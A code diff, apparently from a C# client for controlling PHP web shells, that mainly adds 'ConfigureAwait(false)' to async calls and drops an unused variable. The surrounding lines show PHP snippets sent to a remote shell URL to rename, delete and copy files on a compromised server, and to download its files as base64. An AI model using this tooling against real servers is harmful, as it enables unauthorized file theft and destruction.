@@ -198,7 +198,7 @@ namespace bantam
         private async static Task<string> ExecutePHPCode(string shellUrl, string phpCode, bool encryptResponse, int ResponseEncryptionMode)
         {
             //todo get caller function name for logging
-            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
 
             if (string.IsNullOrEmpty(response.Result)) {
                 //todo level 3 logging
@@ -269,7 +269,7 @@ namespace bantam
                 if (checkBoxChecked) {
                     ExecutePHPCodeDisplayInRichTextBox(shellUrl, code, "PHP Eval Result - " + shellUrl, encryptResponse, ResponseEncryptionMode);
                 } else {
-                    await WebHelper.ExecuteRemotePHP(shellUrl, code);
+                    await WebHelper.ExecuteRemotePHP(shellUrl, code).ConfigureAwait(false);
                 }
             } else {
                 //todo logging
@@ -793,7 +793,6 @@ namespace bantam
             }
 
             string shellUrl = g_SelectedShellUrl;
-            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
 
             //windows does not currently support uploading
             if (Shells[shellUrl].IsWindows) {
@@ -1136,7 +1135,7 @@ namespace bantam
                 string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                 string phpCode = "@rename('" + fileName + "', '" + newFile + "');";
 
-                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
+                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
             }
         }
 
@@ -1160,7 +1159,7 @@ namespace bantam
 
             if (dialogResult == DialogResult.Yes) {
                 string phpCode = "@unlink('" + path + "');";
-                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
+                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
             }
         }
 
@@ -1181,7 +1180,7 @@ namespace bantam
 
             if (!string.IsNullOrEmpty(newFileName)) {
                 string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
-                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
+                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
             }
         }
 
@@ -1275,7 +1274,7 @@ namespace bantam
                     //todo move phpcode
                     //todo doesnt look like it will work without encryption?
                     string phpCode = "@$result = @base64_encode(@file_get_contents('" + fileName + "'));";
-                    string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);
+                    string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode).ConfigureAwait(false);
                     if (string.IsNullOrEmpty(result) == false) {
                         byte[] fileBytes = Helper.DecodeBase64(result);
                         File.WriteAllBytes(downloadFileDialog.FileName, fileBytes);
